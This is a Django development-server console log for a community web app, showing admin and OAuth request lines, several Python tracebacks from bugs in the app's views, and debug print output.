/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
[08/Dec/2018 08:43:47] "GET /requests HTTP/1.1" 200 5274
[08/Dec/2018 08:43:55] "GET /admin/ HTTP/1.1" 302 0
[08/Dec/2018 08:43:55] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1977
[08/Dec/2018 08:43:56] "GET /static/admin/css/base.css HTTP/1.1" 304 0
[08/Dec/2018 08:43:56] "GET /admin/ HTTP/1.1" 302 0
[08/Dec/2018 08:43:56] "GET /static/admin/css/login.css HTTP/1.1" 304 0
[08/Dec/2018 08:43:56] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1977
[08/Dec/2018 08:43:57] "GET /static/admin/css/responsive.css HTTP/1.1" 304 0
[08/Dec/2018 08:43:58] "GET /static/admin/css/fonts.css HTTP/1.1" 200 423
[08/Dec/2018 08:43:59] "GET /static/admin/css/login.css HTTP/1.1" 200 1203
[08/Dec/2018 08:44:01] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 200 81348
[08/Dec/2018 08:44:03] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 200 80304
[08/Dec/2018 08:44:04] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 200 82564
[08/Dec/2018 08:44:16] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0
[08/Dec/2018 08:44:16] "GET /admin/ HTTP/1.1" 200 10019
[08/Dec/2018 08:44:16] "GET /static/admin/css/dashboard.css HTTP/1.1" 304 0
[08/Dec/2018 08:44:17] "GET /static/admin/img/icon-deletelink.svg HTTP/1.1" 200 392
[08/Dec/2018 08:44:17] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 200 380
[08/Dec/2018 08:44:17] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 200 331
[08/Dec/2018 08:44:21] "GET /admin/togther/members/ HTTP/1.1" 200 4358
[08/Dec/2018 08:44:22] "GET /static/admin/css/changelists.css HTTP/1.1" 304 0
[08/Dec/2018 08:44:22] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 304 0
[08/Dec/2018 08:44:22] "GET /static/admin/js/jquery.init.js HTTP/1.1" 304 0
[08/Dec/2018 08:44:22] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[08/Dec/2018 08:44:22] "GET /static/admin/js/core.js HTTP/1.1" 304 0
[08/Dec/2018 08:44:23] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 304 0
[08/Dec/2018 08:44:23] "GET /static/admin/js/actions.js HTTP/1.1" 304 0
[08/Dec/2018 08:44:23] "GET /static/admin/js/urlify.js HTTP/1.1" 304 0
[08/Dec/2018 08:44:23] "GET /static/admin/js/prepopulate.js HTTP/1.1" 304 0
[08/Dec/2018 08:44:23] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 304 0
[08/Dec/2018 08:44:24] "GET /static/admin/img/tooltag-add.svg HTTP/1.1" 304 0
[08/Dec/2018 08:44:25] "GET /admin/togther/members/1/change/ HTTP/1.1" 200 6205
[08/Dec/2018 08:44:26] "GET /static/admin/css/forms.css HTTP/1.1" 200 8505
[08/Dec/2018 08:44:27] "GET /static/admin/js/change_form.js HTTP/1.1" 200 712
[08/Dec/2018 08:44:27] "GET /static/admin/js/prepopulate_init.js HTTP/1.1" 200 495
[08/Dec/2018 08:44:27] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[08/Dec/2018 08:44:38] "GET /static/admin/css/widgets.css HTTP/1.1" 200 10340
[08/Dec/2018 08:44:41] "GET /admin/togther/members/ HTTP/1.1" 200 4358
[08/Dec/2018 08:44:42] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[08/Dec/2018 08:44:44] "GET /admin/togther/ HTTP/1.1" 200 6500
[08/Dec/2018 08:44:49] "GET /admin/togther/form_response/ HTTP/1.1" 200 4915
[08/Dec/2018 08:44:50] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[08/Dec/2018 08:44:52] "GET /admin/togther/form_response/3/change/ HTTP/1.1" 200 5758
[08/Dec/2018 08:44:53] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[08/Dec/2018 08:44:58] "GET /admin/togther/form_response/ HTTP/1.1" 200 4915
[08/Dec/2018 08:44:58] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[08/Dec/2018 08:45:00] "GET /admin/togther/form_response/1/change/ HTTP/1.1" 200 5757
[08/Dec/2018 08:45:01] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[08/Dec/2018 08:45:05] "GET /admin/togther/form_response/ HTTP/1.1" 200 4915
[08/Dec/2018 08:45:06] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[08/Dec/2018 08:45:07] "GET /admin/togther/form_response/2/change/ HTTP/1.1" 200 5760
[08/Dec/2018 08:45:07] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[08/Dec/2018 08:45:09] "GET /admin/togther/form_response/ HTTP/1.1" 200 4915
[08/Dec/2018 08:45:10] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[08/Dec/2018 08:45:16] "POST /admin/togther/form_response/ HTTP/1.1" 200 3739
[08/Dec/2018 08:45:16] "GET /static/admin/js/cancel.js HTTP/1.1" 200 410
[08/Dec/2018 08:45:18] "POST /admin/togther/form_response/ HTTP/1.1" 302 0
[08/Dec/2018 08:45:18] "GET /admin/togther/form_response/ HTTP/1.1" 200 3353
[08/Dec/2018 08:45:18] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[08/Dec/2018 08:45:19] "GET /static/admin/img/icon-yes.svg HTTP/1.1" 200 436
[08/Dec/2018 08:45:23] "GET / HTTP/1.1" 302 0
Internal Server Error: /dashboard/
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 34, in dashboard
    print(social_user.extra_data['id'])
AttributeError: 'NoneType' object has no attribute 'extra_data'
[08/Dec/2018 08:45:23] "GET /dashboard/ HTTP/1.1" 500 67196
[08/Dec/2018 08:45:30] "GET /community/3/ HTTP/1.1" 200 10185
[08/Dec/2018 08:45:35] "GET /community/3/join HTTP/1.1" 200 5991
Internal Server Error: /community/3/join
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/contrib/auth/decorators.py", line 21, in _wrapped_view
    return view_func(request, *args, **kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 365, in join_community
    req.user_info = user[0]
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/query.py", line 303, in __getitem__
    return qs._result_cache[0]
IndexError: list index out of range
[08/Dec/2018 08:46:10] "POST /community/3/join HTTP/1.1" 500 77703
[08/Dec/2018 08:46:15] "GET /admin/togther/form_response/ HTTP/1.1" 200 4915
[08/Dec/2018 08:46:15] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[08/Dec/2018 08:46:21] "POST /admin/togther/form_response/ HTTP/1.1" 200 3739
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[08/Dec/2018 08:54:57] "GET / HTTP/1.0" 400 62349
[08/Dec/2018 08:56:46] "POST /community/3/join HTTP/1.1" 200 4580
[08/Dec/2018 08:57:51] "GET /profile/4 HTTP/1.1" 200 21644
Not Found: /profile/logo.jpeg
[08/Dec/2018 08:57:52] "GET /profile/logo.jpeg HTTP/1.1" 404 5961
[08/Dec/2018 08:57:55] "GET /profile/4/mycommunities HTTP/1.1" 200 4686
Not Found: /profile/4/logo.jpeg
[08/Dec/2018 08:57:56] "GET /profile/4/logo.jpeg HTTP/1.1" 404 5967
[08/Dec/2018 08:57:57] "GET /profile/4/communities_as_admin HTTP/1.1" 200 5245
[08/Dec/2018 08:58:05] "GET /community/3/ HTTP/1.1" 200 10350
[08/Dec/2018 08:58:08] "GET /media/media/IMG_20181201_152335_6yO0iAi.jpg HTTP/1.1" 200 4146379
[08/Dec/2018 08:58:27] "GET / HTTP/1.1" 302 0
[08/Dec/2018 08:58:27] "GET /dashboard/ HTTP/1.1" 200 14211
Not Found: /dashboard/logo.jpeg
[08/Dec/2018 08:58:28] "GET /dashboard/logo.jpeg HTTP/1.1" 404 5967
[08/Dec/2018 08:59:18] "GET /requests HTTP/1.1" 200 5109
Internal Server Error: /profile/2
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/contrib/auth/decorators.py", line 21, in _wrapped_view
    return view_func(request, *args, **kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 171, in profile
    info = Userinfo.objects.get(user_id = request.user)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/manager.py", line 82, in manager_method
    return getattr(self.get_queryset(), name)(*args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/query.py", line 399, in get
    self.model._meta.object_name
togther.models.Userinfo.DoesNotExist: Userinfo matching query does not exist.
[08/Dec/2018 08:59:22] "GET /profile/2 HTTP/1.1" 500 80268
[08/Dec/2018 08:59:29] "GET /logout HTTP/1.1" 302 0
[08/Dec/2018 08:59:30] "GET / HTTP/1.1" 200 2426
[08/Dec/2018 08:59:32] "GET /oauth/login/linkedin-oauth2/ HTTP/1.1" 302 0
[08/Dec/2018 08:59:42] "GET /oauth/complete/linkedin-oauth2/?code=AQSQff3W_E36MsC2ktSmwceNiBVZzG8_MoscEFMKEtrNHvM6jZpTwm_MWEaEGbw1oe2BkW5FZzyQOdMTvg3NagfNbgf-ufBFYinWlJZNjPUqkk9d19UqW0apj1X93xbXFmjCrx_OCHWvvkpVRgmRTQen-vdV9j_dUW9IVMoLf3LXFFTxzf9RSaUzOChXIA&state=IezajSLiLs7TS4m4hWY77P7UbrFndlmB HTTP/1.1" 302 0
[08/Dec/2018 08:59:43] "GET /dashboard/ HTTP/1.1" 200 14211
[08/Dec/2018 08:59:47] "GET /requests HTTP/1.1" 200 6717
Not Found: /logo.jpeg
[08/Dec/2018 09:00:11] "GET /logo.jpeg HTTP/1.1" 404 5937
[08/Dec/2018 09:00:13] "GET /requests HTTP/1.1" 200 6717
[08/Dec/2018 09:00:20] "GET /requests/user_response/3 HTTP/1.1" 200 4688
Not Found: /requests/user_response/logo.jpeg
[08/Dec/2018 09:00:20] "GET /requests/user_response/logo.jpeg HTTP/1.1" 404 6006
[08/Dec/2018 09:00:22] "GET /requests/user_response/3 HTTP/1.1" 200 4688
[08/Dec/2018 09:00:32] "GET /requests/user_response/3 HTTP/1.1" 200 4688
Not Found: /requests/user_response/logo.jpeg
[08/Dec/2018 09:00:33] "GET /requests/user_response/logo.jpeg HTTP/1.1" 404 6006
[08/Dec/2018 09:01:00] "GET /profile/4 HTTP/1.1" 200 21644
[08/Dec/2018 09:01:02] "GET /creategroup/ HTTP/1.1" 200 6143
Not Found: /creategroup/logo.jpeg
[08/Dec/2018 09:01:03] "GET /creategroup/logo.jpeg HTTP/1.1" 404 5973
[08/Dec/2018 09:01:18] "GET /admin/ HTTP/1.1" 302 0
[08/Dec/2018 09:01:18] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1977
[08/Dec/2018 09:01:19] "GET /static/admin/css/login.css HTTP/1.1" 200 1203
[08/Dec/2018 09:01:19] "GET /admin/ HTTP/1.1" 302 0
[08/Dec/2018 09:01:19] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1977
[08/Dec/2018 09:01:20] "GET /static/admin/css/fonts.css HTTP/1.1" 200 423
[08/Dec/2018 09:01:21] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 200 80304
[08/Dec/2018 09:01:21] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 200 82564
[08/Dec/2018 09:01:22] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 200 81348
[08/Dec/2018 09:02:22] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0
[08/Dec/2018 09:02:23] "GET /admin/ HTTP/1.1" 200 10820
[08/Dec/2018 09:02:23] "GET /static/admin/img/icon-deletelink.svg HTTP/1.1" 200 392
[08/Dec/2018 09:02:34] "GET /admin/togther/form_response/ HTTP/1.1" 200 5650
[08/Dec/2018 09:02:35] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[08/Dec/2018 09:02:38] "GET /admin/togther/form_response/9/change/ HTTP/1.1" 200 5758
[08/Dec/2018 09:02:38] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[08/Dec/2018 09:02:42] "GET /admin/togther/form_response/ HTTP/1.1" 200 5650
[08/Dec/2018 09:02:42] "GET /profile/4 HTTP/1.1" 200 21644
[08/Dec/2018 09:02:42] "GET /profile/4/mycommunities HTTP/1.1" 200 4686
[08/Dec/2018 09:02:44] "GET /admin/togther/form_response/8/change/ HTTP/1.1" 200 5760
[08/Dec/2018 09:02:44] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[08/Dec/2018 09:02:46] "GET /profile/4/communities_as_admin HTTP/1.1" 200 5245
[08/Dec/2018 09:02:48] "GET /admin/togther/form_response/ HTTP/1.1" 200 5650
[08/Dec/2018 09:02:50] "GET /admin/togther/form_response/5/change/ HTTP/1.1" 200 5759
[08/Dec/2018 09:02:50] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[08/Dec/2018 09:02:54] "GET /admin/togther/form_response/ HTTP/1.1" 200 5650
[08/Dec/2018 09:02:56] "GET /admin/togther/form_response/7/change/ HTTP/1.1" 200 5757
[08/Dec/2018 09:02:56] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[08/Dec/2018 09:03:02] "GET /admin/togther/form_response/ HTTP/1.1" 200 5650
[08/Dec/2018 09:03:03] "GET /admin/togther/form_response/8/change/ HTTP/1.1" 200 5760
[08/Dec/2018 09:03:04] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[08/Dec/2018 09:03:05] "GET /profile/4/communities_as_admin HTTP/1.1" 200 5245
[08/Dec/2018 09:03:06] "GET /admin/togther/form_response/ HTTP/1.1" 200 5650
[08/Dec/2018 09:03:08] "GET /admin/togther/form_response/9/change/ HTTP/1.1" 200 5758
[08/Dec/2018 09:03:08] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[08/Dec/2018 09:03:12] "GET / HTTP/1.1" 302 0
[08/Dec/2018 09:03:13] "GET /dashboard/ HTTP/1.1" 200 14211
[08/Dec/2018 09:03:28] "GET /requests/user_response/3 HTTP/1.1" 200 4688
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[08/Dec/2018 09:05:40] "GET / HTTP/1.1" 400 62458
Forbidden (CSRF token missing or incorrect.): /admin/togther/form_response/
[08/Dec/2018 09:06:13] "POST /admin/togther/form_response/ HTTP/1.1" 403 2513
Performing system checks...

System check identified no issues (0 silenced).
December 08, 2018 - 08:43:42
Django version 2.1, using settings 'project.settings'
Starting development server at http://0.0.0.0:80/
Quit the server with CONTROL-C.
{}
<QuerySet [<Admins: Admins object (1)>]>
[]
admin <QuerySet [<Admins: Admins object (1)>]>
1
admin:  [<QuerySet [<Userinfo: Apoorv Khare>]>]
3
<QuerySet [<Userinfo: Apoorv Khare>]>
[<Userinfo: Apoorv Khare>]
3
data: <QuerySet [<Form_data: Form_data object (3)>, <Form_data: Form_data object (2)>, <Form_data: Form_data object (1)>]>
3
{'csrfmiddlewaretoken': 'C2gTMq3cwXA03YU9MZGtPFxtg8Yl8FK8MWVDj64BR1k7Qe7yHETae74kDZNe4J7A', 'why': '', 'Experience': '', 'College': ''}
why
Experience
College
3
{'csrfmiddlewaretoken': 'V5GJ29jWYt9l586K392edb3L4tWzkQNZOCxZL4rJG7n4O9WRhhkJBDA4JZwamBgE', 'why': 'Amama', 'Experience': '5', 'College': '13'}
why
Experience
College
{}
<QuerySet []>
<QuerySet []>
admin <QuerySet [<Admins: Admins object (1)>]>
1
admin:  [<QuerySet [<Userinfo: Apoorv Khare>]>]
3
<QuerySet [<Userinfo: Apoorv Khare>]>
[<Userinfo: Apoorv Khare>]
{}
{}
<QuerySet []>
[]
here
None
{}
{}
<QuerySet [<Admins: Admins object (1)>]>
3
[<Requests: Requests object (1)>]
{}
<QuerySet [<Admins: Admins object (1)>]>
3
[<Requests: Requests object (1)>]
3
<QuerySet []>
3
<QuerySet []>
3
<QuerySet []>
{}
<QuerySet []>
<QuerySet []>
{}
<QuerySet []>
<QuerySet []>
{}
3
<QuerySet []>
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
[08/Dec/2018 09:09:54] "GET / HTTP/1.1" 302 0
Internal Server Error: /dashboard/
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 34, in dashboard
    print(social_user.extra_data['id'])
AttributeError: 'NoneType' object has no attribute 'extra_data'
[08/Dec/2018 09:09:55] "GET /dashboard/ HTTP/1.1" 500 67160
[08/Dec/2018 09:10:00] "GET /admin/logout/ HTTP/1.1" 200 1207
[08/Dec/2018 09:10:11] "GET /dashboard/ HTTP/1.1" 200 13502
[08/Dec/2018 09:10:21] "GET / HTTP/1.1" 200 2426
[08/Dec/2018 09:10:23] "GET /oauth/login/linkedin-oauth2/ HTTP/1.1" 302 0
[08/Dec/2018 09:10:25] "GET /oauth/complete/linkedin-oauth2/?code=AQT_KLABTvREUCPop57rKFLxFWj_wiv1NzYWSoZ05B1zED84O7M8o_VPV7NApiUr7Uv5EzFLhafb-IbPLxkOULuohuynROYU_eFBiUuhqCrNYRPTTlOI-3tCTZUVJSWVzqAa-u1iAwOB4kn31UMv-wUTPlVxbB6CRIhO0B-6lMnxVQVFNCG9paOPL-Dx3Q&state=4nhhef0ORXpq30arEz8noINr90FT7aZU HTTP/1.1" 302 0
[08/Dec/2018 09:10:25] "GET /dashboard/ HTTP/1.1" 200 14211
[08/Dec/2018 09:10:31] "GET /requests HTTP/1.1" 200 6717
[08/Dec/2018 09:11:00] "GET /requests/user_response/3 HTTP/1.1" 200 4688
Performing system checks...

System check identified no issues (0 silenced).
December 08, 2018 - 09:09:52
Django version 2.1, using settings 'project.settings'
Starting development server at http://0.0.0.0:80/
Quit the server with CONTROL-C.
{}
here
None
{}
{}
<QuerySet [<Admins: Admins object (1)>]>
3
[<Requests: Requests object (1)>]
3
<QuerySet []>
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
Unhandled exception in thread started by <function check_errors.<locals>.wrapper at 0x7ff5120c6ae8>
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/utils/autoreload.py", line 225, in wrapper
    fn(*args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/management/commands/runserver.py", line 117, in inner_run
    self.check(display_num_errors=True)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/management/base.py", line 379, in check
    include_deployment_checks=include_deployment_checks,
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/management/base.py", line 366, in _run_checks
    return checks.run_checks(**kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/checks/registry.py", line 71, in run_checks
    new_errors = check(app_configs=app_configs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/checks/urls.py", line 40, in check_url_namespaces_unique
    all_namespaces = _load_all_namespaces(resolver)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/checks/urls.py", line 57, in _load_all_namespaces
    url_patterns = getattr(resolver, 'url_patterns', [])
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/utils/functional.py", line 37, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/urls/resolvers.py", line 533, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/utils/functional.py", line 37, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/urls/resolvers.py", line 526, in urlconf_module
    return import_module(self.urlconf_name)
  File "/home/ec2-user/venv/lib64/python3.7/importlib/__init__.py", line 127, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 1006, in _gcd_import
  File "<frozen importlib._bootstrap>", line 983, in _find_and_load
  File "<frozen importlib._bootstrap>", line 967, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 677, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 728, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "/home/ec2-user/Togther/project/project/urls.py", line 19, in <module>
    from togther import views  
  File "/home/ec2-user/Togther/project/togther/views.py", line 489
    responses = Form_response.objects.all().filter(user.id = user_id)
                                                  ^
SyntaxError: keyword can't be an expression
Performing system checks...

/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
Unhandled exception in thread started by <function check_errors.<locals>.wrapper at 0x7f86e0aa2ae8>
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/utils/autoreload.py", line 225, in wrapper
    fn(*args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/management/commands/runserver.py", line 117, in inner_run
    self.check(display_num_errors=True)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/management/base.py", line 379, in check
    include_deployment_checks=include_deployment_checks,
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/management/base.py", line 366, in _run_checks
    return checks.run_checks(**kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/checks/registry.py", line 71, in run_checks
    new_errors = check(app_configs=app_configs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/checks/urls.py", line 40, in check_url_namespaces_unique
    all_namespaces = _load_all_namespaces(resolver)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/checks/urls.py", line 57, in _load_all_namespaces
    url_patterns = getattr(resolver, 'url_patterns', [])
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/utils/functional.py", line 37, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/urls/resolvers.py", line 533, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/utils/functional.py", line 37, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/urls/resolvers.py", line 526, in urlconf_module
    return import_module(self.urlconf_name)
  File "/home/ec2-user/venv/lib64/python3.7/importlib/__init__.py", line 127, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 1006, in _gcd_import
  File "<frozen importlib._bootstrap>", line 983, in _find_and_load
  File "<frozen importlib._bootstrap>", line 967, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 677, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 728, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "/home/ec2-user/Togther/project/project/urls.py", line 19, in <module>
    from togther import views  
  File "/home/ec2-user/Togther/project/togther/views.py", line 489
    responses = Form_response.objects.all().filter(user.id = user_id)
                                                  ^
SyntaxError: keyword can't be an expression
Performing system checks...

/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
Internal Server Error: /
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 34, in dashboard
    print(social_user.extra_data['id'])
AttributeError: 'NoneType' object has no attribute 'extra_data'
[08/Dec/2018 17:07:05] "GET / HTTP/1.1" 500 67082
[08/Dec/2018 17:07:10] "GET /logout HTTP/1.1" 302 0
[08/Dec/2018 17:07:10] "GET /login/ HTTP/1.1" 200 2576
[08/Dec/2018 17:07:11] "GET /media/media/logo.jpeg HTTP/1.1" 304 0
Not Found: /login/logo.jpeg
[08/Dec/2018 17:07:11] "GET /login/logo.jpeg HTTP/1.1" 404 5976
[08/Dec/2018 17:07:12] "GET /media/media/favicon.ico HTTP/1.1" 200 32988
[08/Dec/2018 17:07:14] "GET /login/ HTTP/1.1" 200 2576
[08/Dec/2018 17:07:14] "GET /media/media/favicon.ico HTTP/1.1" 200 32988
Performing system checks...

System check identified no issues (0 silenced).
December 08, 2018 - 17:06:59
Django version 2.1, using settings 'project.settings'
Starting development server at http://0.0.0.0:80/
Quit the server with CONTROL-C.
here
None
here
None
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
[08/Dec/2018 17:08:24] "GET / HTTP/1.1" 200 11372
[08/Dec/2018 17:08:24] "GET /media/media/logo.png HTTP/1.1" 200 11255
[08/Dec/2018 17:08:37] "GET /community/3 HTTP/1.1" 301 0
[08/Dec/2018 17:08:37] "GET /community/3/ HTTP/1.1" 200 9489
[08/Dec/2018 17:08:40] "GET /community/3/members_list HTTP/1.1" 200 5467
[08/Dec/2018 17:08:44] "GET /profile/4 HTTP/1.1" 302 0
[08/Dec/2018 17:08:44] "GET /accounts/login/?next=/profile/4 HTTP/1.1" 200 2576
Not Found: /accounts/login/logo.jpeg
[08/Dec/2018 17:08:45] "GET /accounts/login/logo.jpeg HTTP/1.1" 404 6003
Not Found: /accounts/media/media/favicon.ico
